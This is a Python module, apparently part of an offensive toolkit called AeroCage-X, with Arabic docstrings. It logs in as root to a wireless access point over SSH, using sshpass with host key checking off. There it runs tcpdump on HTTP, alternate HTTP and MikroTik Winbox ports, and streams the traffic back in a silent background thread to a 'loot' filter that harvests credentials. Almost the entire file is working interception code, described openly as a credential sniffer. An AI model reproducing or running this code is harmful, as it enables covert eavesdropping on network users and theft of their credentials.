#!/usr/bin/env python3
"""
File Name: silent_sigint_sniffer.py
Path: /home/kali/AeroCage-XV1.0.1/modules/silent_sigint_sniffer.py
Created Date: 2026-05-25
Version: 1.0.3
Description: Silent Packet Inspection and Network Metrics Harvesting Module 
             for AeroCage-X. Implements streamlined thread execution.
"""

import subprocess
import threading

from core.system_guard import SystemGuard
from modules.silent_loot_filter import SilentLootFilter


class SilentSigIntSniffer:
    """
    Main Network Stream Analyzer Object.
    Deploys raw remote connection endpoints and manages streamlined data execution.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك التحليل والتحقق من صلاحيات مدير النظام عن بعد"""
        SystemGuard.enforce_root_privileges("Silent SigInt & Credential Sniffer")

        self.ap_ip = SystemGuard.sanitize_input(ap_ip, "interface")
        self.ap_password = ap_password
        self.loot_auditor = SilentLootFilter(self.ap_ip)
        self.sniffing_active = False

    def read_remote_wireless_stream(self, ap_interface: str) -> subprocess.Popen:
        """قراءة تيار البيانات لكرت الوايرلس عن بُعد عبر أنبوب SSH معزول الشل"""
        clean_inf = SystemGuard.sanitize_input(ap_interface, "interface")

        remote_cmd = (
            f"tcpdump -i {clean_inf} -w - -s 0 "
            "'tcp port 80 or tcp port 8291 or tcp port 8080'"
        )
        base_ssh_args = [
            "sshpass", "-p", self.ap_password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"root@{self.ap_ip}", remote_cmd
        ]

        try:
            # pylint: disable=consider-using-with
            process = subprocess.Popen(
                base_ssh_args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False
            )
            return process
        except (subprocess.SubprocessError, FileNotFoundError, OSError) as e:
            print(f"[-] Execution Exception opening remote monitoring pipe: {e}")
            return None

    def start_silent_intel_harvesting(self, ap_interface: str):
        """إطلاق خيط معالجة مستقل لقراءة البيانات وعزلها في قاعدة البيانات"""
        self.sniffing_active = True
        threading.Thread(
            target=self._harvesting_worker,
            args=(ap_interface,),
            daemon=True
        ).start()

    def _harvesting_worker(self, interface: str):
        """خيط العمل الخلفي - يقرأ تيار المخرجات ويمرر الكتل لملف الفرز المنفصل"""
        print("[📡 SIGINT] Initiating silent wireless stream analysis pipeline...")
        process = self.read_remote_wireless_stream(interface)
        if not process:
            return

        try:
            while self.sniffing_active and process.poll() is None:
                line = process.stdout.readline()
                if not line:
                    break

                try:
                    decoded_line = line.decode('utf-8', errors='ignore')
                    # تمرير السلسلة للمكون التحليلي المنفصل تزامناً مع فكرتك العبقرية لتقليص الأكواد
                    self.loot_auditor.inspect_and_archive_chunk(decoded_line)
                except (ValueError, UnicodeDecodeError):
                    continue

        except (IOError, OSError, ValueError) as e:
            print(f"[-] Runtime Error inside telemetry monitoring thread: {e}")
        finally:
            if process:
                process.terminate()

    def stop_silent_harvesting(self):
        """كبح محركات الفحص وإغلاق الأنابيب المفتوحة"""
        self.sniffing_active = False
        print("[+] Telemetry harvesting pipeline deactivated cleanly.")


if __name__ == "__main__":
    print("[+] Silent SigInt Sniffer module deployment verified.")
